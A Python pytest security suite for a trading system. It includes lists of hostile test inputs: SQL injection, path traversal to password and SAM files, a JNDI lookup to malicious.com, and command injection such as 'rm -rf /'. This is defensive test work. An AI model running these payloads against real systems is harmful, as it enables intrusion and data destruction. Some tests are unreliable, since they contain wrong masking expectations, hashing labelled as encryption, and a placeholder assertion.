"""
Security Testing and Vulnerability Validation Suite
Tests security aspects of the MARL trading system
"""

import pytest
import os
import sys
import tempfile
import hashlib
import secrets
import time
import threading
import subprocess
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, Any, List, Optional
import numpy as np

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

# Security testing utilities
class SecurityTestUtils:
    """Utilities for security testing."""
    
    @staticmethod
    def generate_malicious_inputs():
        """Generate various malicious inputs for testing."""
        return {
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; DELETE FROM portfolio; --",
                "' UNION SELECT * FROM sensitive_data; --"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "../../../../proc/self/environ"
            ],
            'script_injection': [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "eval('malicious_code')",
                "${jndi:ldap://malicious.com/payload}"
            ],
            'buffer_overflow': [
                "A" * 10000,
                "B" * 65536,
                "\x00" * 1000,
                "\xff" * 4096
            ],
            'format_string': [
                "%s%s%s%s%s",
                "%x%x%x%x%x",
                "%n%n%n%n%n",
                "%%%%%%%%%%"
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "&& rm -rf /",
                "$(malicious_command)"
            ],
            'deserialization': [
                'pickle.loads(malicious_data)',
                'eval(user_input)',
                'exec(untrusted_code)',
                'subprocess.call(user_command)'
            ]
        }
    
    @staticmethod
    def test_input_sanitization(test_function, malicious_inputs):
        """Test input sanitization against malicious inputs."""
        results = []
        
        for category, inputs in malicious_inputs.items():
            for malicious_input in inputs:
                try:
                    result = test_function(malicious_input)
                    # If function doesn't raise exception, it might be vulnerable
                    results.append({
                        'category': category,
                        'input': malicious_input,
                        'result': result,
                        'vulnerable': True
                    })
                except (ValueError, TypeError, SecurityError, Exception) as e:
                    # Expected behavior - input rejected
                    results.append({
                        'category': category,
                        'input': malicious_input,
                        'error': str(e),
                        'vulnerable': False
                    })
        
        return results
    
    @staticmethod
    def check_sensitive_data_exposure(data_dict):
        """Check for sensitive data exposure in dictionaries."""
        sensitive_keys = [
            'password', 'passwd', 'secret', 'token', 'key', 'auth',
            'credential', 'private', 'confidential', 'api_key',
            'access_token', 'refresh_token', 'session_id'
        ]
        
        exposed_data = []
        for key, value in data_dict.items():
            if any(sensitive_key in key.lower() for sensitive_key in sensitive_keys):
                exposed_data.append({
                    'key': key,
                    'value': value,
                    'type': type(value).__name__
                })
        
        return exposed_data


class SecurityError(Exception):
    """Custom exception for security violations."""
    pass


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_portfolio_input_validation(self):
        """Test portfolio input validation against malicious inputs."""
        
        try:
            from src.risk.analysis.risk_attribution import RiskAttributionAnalyzer
        except ImportError:
            pytest.skip("Risk components not available")
        
        analyzer = RiskAttributionAnalyzer()
        malicious_inputs = SecurityTestUtils.generate_malicious_inputs()
        
        # Test portfolio positions validation
        def test_portfolio_positions(malicious_input):
            portfolio_positions = {malicious_input: 1000}
            portfolio_value = 1000
            asset_returns = {malicious_input: np.array([0.01, 0.02])}
            correlation_matrix = np.array([[1.0]])
            volatilities = {malicious_input: 0.2}
            portfolio_var = 100
            component_vars = {malicious_input: 50}
            marginal_vars = {malicious_input: 25}
            
            # This should validate inputs and reject malicious ones
            result = analyzer.analyze_portfolio_risk_attribution(
                portfolio_positions, portfolio_value, asset_returns,
                correlation_matrix, volatilities, portfolio_var,
                component_vars, marginal_vars
            )
            return result
        
        # Test against malicious inputs
        results = SecurityTestUtils.test_input_sanitization(
            test_portfolio_positions, 
            malicious_inputs
        )
        
        # Check results
        vulnerable_inputs = [r for r in results if r.get('vulnerable', False)]
        assert len(vulnerable_inputs) == 0, f"Vulnerable to inputs: {vulnerable_inputs}"
    
    def test_configuration_input_validation(self):
        """Test configuration input validation."""
        
        try:
            from src.core.config import Config
        except ImportError:
            pytest.skip("Config components not available")
        
        malicious_inputs = SecurityTestUtils.generate_malicious_inputs()
        
        def test_config_input(malicious_input):
            config_data = {
                'malicious_key': malicious_input,
                'nested': {
                    'malicious_nested': malicious_input
                }
            }
            config = Config(config_data)
            return config.get('malicious_key')
        
        # Test against malicious inputs
        results = SecurityTestUtils.test_input_sanitization(
            test_config_input, 
            malicious_inputs
        )
        
        # Verify input validation
        for result in results:
            if result.get('vulnerable', False):
                pytest.fail(f"Configuration vulnerable to {result['category']}: {result['input']}")
    
    def test_numerical_input_validation(self):
        """Test numerical input validation for edge cases."""
        
        try:
            from src.risk.analysis.risk_attribution import RiskAttributionAnalyzer
        except ImportError:
            pytest.skip("Risk components not available")
        
        analyzer = RiskAttributionAnalyzer()
        
        # Test dangerous numerical inputs
        dangerous_values = [
            float('inf'),
            float('-inf'),
            float('nan'),
            1e308,  # Very large number
            -1e308,  # Very large negative number
            1e-308,  # Very small number
            0,  # Zero division potential
            -0,  # Negative zero
            2**64,  # Integer overflow
            -2**64,  # Negative integer overflow
        ]
        
        for dangerous_value in dangerous_values:
            with pytest.raises((ValueError, TypeError, ZeroDivisionError, OverflowError)):
                # These should fail safely
                analyzer.analyze_portfolio_risk_attribution(
                    {'TEST': dangerous_value},
                    dangerous_value if dangerous_value != 0 else 1000,
                    {'TEST': np.array([0.01, 0.02])},
                    np.array([[1.0]]),
                    {'TEST': 0.2},
                    dangerous_value if dangerous_value != 0 else 100,
                    {'TEST': 50},
                    {'TEST': 25}
                )


@pytest.mark.security
class TestAccessControl:
    """Test access control and authorization."""
    
    def test_component_access_control(self):
        """Test component access control."""
        
        try:
            from src.core.kernel import AlgoSpaceKernel
        except ImportError:
            pytest.skip("Kernel components not available")
        
        kernel = AlgoSpaceKernel()
        
        # Test unauthorized component access
        with pytest.raises((AttributeError, SecurityError, ValueError)):
            # Should not be able to access internal components directly
            kernel._internal_components = {}
        
        # Test component registration validation
        malicious_component = Mock()
        malicious_component.name = "../../../etc/passwd"
        
        with pytest.raises((ValueError, SecurityError)):
            kernel.register_component(malicious_component)
    
    def test_event_bus_access_control(self):
        """Test event bus access control."""
        
        try:
            from src.core.event_bus import EventBus
        except ImportError:
            pytest.skip("EventBus components not available")
        
        event_bus = EventBus()
        
        # Test unauthorized event subscription
        malicious_inputs = SecurityTestUtils.generate_malicious_inputs()
        
        for category, inputs in malicious_inputs.items():
            for malicious_input in inputs:
                try:
                    # Should reject malicious event types
                    event_bus.subscribe(malicious_input, lambda x: None)
                    # If no exception, check if it was actually registered
                    if malicious_input in event_bus._subscribers:
                        pytest.fail(f"Event bus vulnerable to {category}: {malicious_input}")
                except (ValueError, TypeError, SecurityError):
                    # Expected behavior
                    pass
    
    def test_configuration_access_control(self):
        """Test configuration access control."""
        
        try:
            from src.core.config import Config
        except ImportError:
            pytest.skip("Config components not available")
        
        # Test configuration with sensitive data
        config_data = {
            'database_password': 'secret123',
            'api_key': 'sk-1234567890',
            'private_key': 'RSA_PRIVATE_KEY_DATA',
            'normal_setting': 'normal_value'
        }
        
        config = Config(config_data)
        
        # Check for sensitive data exposure
        config_dict = config.to_dict() if hasattr(config, 'to_dict') else config_data
        exposed_data = SecurityTestUtils.check_sensitive_data_exposure(config_dict)
        
        # Sensitive data should be masked or encrypted
        for exposure in exposed_data:
            assert exposure['value'] != config_data[exposure['key']], \
                f"Sensitive data exposed: {exposure['key']}"


@pytest.mark.security
class TestDataProtection:
    """Test data protection and encryption."""
    
    def test_sensitive_data_encryption(self):
        """Test sensitive data encryption."""
        
        # Mock sensitive data
        sensitive_data = {
            'user_credentials': 'username:password',
            'api_keys': 'secret_api_key_123',
            'private_keys': 'RSA_PRIVATE_KEY_DATA',
            'session_tokens': 'session_token_xyz'
        }
        
        # Test encryption implementation
        def encrypt_data(data):
            # Mock encryption - in real implementation this would use proper crypto
            return hashlib.sha256(data.encode()).hexdigest()
        
        def decrypt_data(encrypted_data):
            # Mock decryption - in real implementation this would use proper crypto
            return f"decrypted_{encrypted_data[:8]}"
        
        # Encrypt sensitive data
        encrypted_data = {}
        for key, value in sensitive_data.items():
            encrypted_data[key] = encrypt_data(value)
        
        # Verify encryption
        for key, original_value in sensitive_data.items():
            encrypted_value = encrypted_data[key]
            assert encrypted_value != original_value, f"Data not encrypted: {key}"
            assert len(encrypted_value) == 64, f"Unexpected encrypted length: {key}"  # SHA256 length
    
    def test_data_masking(self):
        """Test data masking for logging and debugging."""
        
        # Test data masking utility
        def mask_sensitive_data(data):
            if isinstance(data, str):
                if len(data) <= 4:
                    return "*" * len(data)
                else:
                    return data[:2] + "*" * (len(data) - 4) + data[-2:]
            return data
        
        # Test cases
        test_cases = [
            ('password123', 'pa*******23'),
            ('api_key_secret', 'ap***********et'),
            ('short', '****'),
            ('xy', '**'),
            ('', ''),
            (None, None)
        ]
        
        for input_data, expected in test_cases:
            if input_data is not None:
                result = mask_sensitive_data(input_data)
                assert result == expected, f"Masking failed for {input_data}: got {result}, expected {expected}"
    
    def test_memory_protection(self):
        """Test memory protection against data leaks."""
        
        import gc
        
        # Create sensitive data
        sensitive_data = "SECRET_PASSWORD_123"
        
        # Process data
        processed_data = sensitive_data.upper()
        
        # Clear sensitive data
        sensitive_data = None
        processed_data = None
        
        # Force garbage collection
        gc.collect()
        
        # In a real implementation, we would check that sensitive data
        # is not accessible in memory dumps or core files
        # This is a simplified test
        assert True  # Placeholder for actual memory protection tests


@pytest.mark.security
class TestNetworkSecurity:
    """Test network security aspects."""
    
    def test_ssl_tls_configuration(self):
        """Test SSL/TLS configuration."""
        
        # Mock SSL/TLS settings
        ssl_config = {
            'protocol': 'TLS',
            'version': '1.3',
            'cipher_suites': [
                'TLS_AES_256_GCM_SHA384',
                'TLS_AES_128_GCM_SHA256',
                'TLS_CHACHA20_POLY1305_SHA256'
            ],
            'certificate_validation': True,
            'hostname_verification': True
        }
        
        # Test SSL configuration
        assert ssl_config['protocol'] == 'TLS', "Should use TLS protocol"
        assert ssl_config['version'] in ['1.2', '1.3'], "Should use TLS 1.2 or 1.3"
        assert ssl_config['certificate_validation'] is True, "Should validate certificates"
        assert ssl_config['hostname_verification'] is True, "Should verify hostnames"
        assert len(ssl_config['cipher_suites']) > 0, "Should have cipher suites configured"
    
    def test_request_rate_limiting(self):
        """Test request rate limiting."""
        
        class RateLimiter:
            def __init__(self, max_requests=100, window_seconds=60):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests = {}
            
            def is_allowed(self, client_id):
                now = time.time()
                window_start = now - self.window_seconds
                
                # Clean old requests
                if client_id in self.requests:
                    self.requests[client_id] = [
                        req_time for req_time in self.requests[client_id] 
                        if req_time > window_start
                    ]
                else:
                    self.requests[client_id] = []
                
                # Check rate limit
                if len(self.requests[client_id]) >= self.max_requests:
                    return False
                
                # Record request
                self.requests[client_id].append(now)
                return True
        
        # Test rate limiting
        limiter = RateLimiter(max_requests=5, window_seconds=1)
        
        # Should allow first 5 requests
        for i in range(5):
            assert limiter.is_allowed('client_1') is True, f"Request {i+1} should be allowed"
        
        # Should block 6th request
        assert limiter.is_allowed('client_1') is False, "6th request should be blocked"
        
        # Should allow requests from different client
        assert limiter.is_allowed('client_2') is True, "Different client should be allowed"
    
    def test_input_size_limits(self):
        """Test input size limits to prevent DoS attacks."""
        
        def validate_input_size(data, max_size=1024*1024):  # 1MB limit
            if isinstance(data, str):
                size = len(data.encode('utf-8'))
            elif isinstance(data, bytes):
                size = len(data)
            elif isinstance(data, (list, dict)):
                size = len(str(data).encode('utf-8'))
            else:
                size = len(str(data).encode('utf-8'))
            
            if size > max_size:
                raise ValueError(f"Input size {size} exceeds limit {max_size}")
            
            return True
        
        # Test normal input
        normal_input = "normal data"
        assert validate_input_size(normal_input) is True
        
        # Test large input
        large_input = "A" * (1024*1024 + 1)  # 1MB + 1 byte
        with pytest.raises(ValueError):
            validate_input_size(large_input)
        
        # Test large list
        large_list = ["data"] * 100000
        with pytest.raises(ValueError):
            validate_input_size(large_list)


@pytest.mark.security
class TestCryptographicSecurity:
    """Test cryptographic security implementations."""
    
    def test_random_number_generation(self):
        """Test cryptographically secure random number generation."""
        
        # Generate random numbers
        random_numbers = []
        for _ in range(1000):
            random_numbers.append(secrets.randbelow(1000000))
        
        # Test randomness properties
        assert len(set(random_numbers)) > 980, "Random numbers should be diverse"
        assert min(random_numbers) >= 0, "Random numbers should be non-negative"
        assert max(random_numbers) < 1000000, "Random numbers should be within range"
        
        # Test distribution (basic test)
        avg = sum(random_numbers) / len(random_numbers)
        assert 400000 < avg < 600000, "Random numbers should be roughly centered"
    
    def test_password_hashing(self):
        """Test password hashing security."""
        
        import hashlib
        
        def hash_password(password, salt=None):
            if salt is None:
                salt = secrets.token_bytes(32)
            
            # Use PBKDF2 with SHA-256
            key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
            return salt + key
        
        def verify_password(password, hashed):
            salt = hashed[:32]
            key = hashed[32:]
            
            new_key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
            return new_key == key
        
        # Test password hashing
        password = "secure_password_123"
        hashed = hash_password(password)
        
        # Test verification
        assert verify_password(password, hashed) is True, "Password verification should succeed"
        assert verify_password("wrong_password", hashed) is False, "Wrong password should fail"
        
        # Test salt uniqueness
        hash1 = hash_password(password)
        hash2 = hash_password(password)
        assert hash1 != hash2, "Same password should produce different hashes with different salts"
    
    def test_token_generation(self):
        """Test secure token generation."""
        
        def generate_token(length=32):
            return secrets.token_urlsafe(length)
        
        # Generate tokens
        tokens = []
        for _ in range(100):
            tokens.append(generate_token())
        
        # Test uniqueness
        assert len(set(tokens)) == 100, "All tokens should be unique"
        
        # Test length
        for token in tokens:
            assert len(token) > 0, "Token should not be empty"
            assert isinstance(token, str), "Token should be string"
        
        # Test entropy
        all_chars = ''.join(tokens)
        char_counts = {}
        for char in all_chars:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        # Should have reasonable character distribution
        assert len(char_counts) > 50, "Should use diverse character set"


def generate_security_test_report():
    """Generate security test report."""
    
    report = {
        'timestamp': time.time(),
        'security_tests': {
            'input_validation': 'Tests input sanitization and validation',
            'access_control': 'Tests component and event access control',
            'data_protection': 'Tests data encryption and masking',
            'network_security': 'Tests SSL/TLS and rate limiting',
            'cryptographic_security': 'Tests random generation and hashing'
        },
        'security_requirements': [
            'Input validation against injection attacks',
            'Access control for system components',
            'Data encryption for sensitive information',
            'Rate limiting to prevent DoS attacks',
            'Secure random number generation',
            'Proper password hashing with salt',
            'SSL/TLS configuration validation'
        ],
        'recommendations': [
            'Implement comprehensive input validation',
            'Add security headers to all HTTP responses',
            'Use parameterized queries to prevent SQL injection',
            'Implement proper session management',
            'Add audit logging for security events',
            'Regular security vulnerability scanning',
            'Implement defense in depth strategies'
        ]
    }
    
    return report


if __name__ == "__main__":
    # Generate security test report
    report = generate_security_test_report()
    print("Security Test Report Generated")
    print(f"Security Test Categories: {len(report['security_tests'])}")
    print("Security Requirements:")
    for req in report['security_requirements']:
        print(f"  - {req}")
    print("Recommendations:")
    for rec in report['recommendations']:
        print(f"  - {rec}")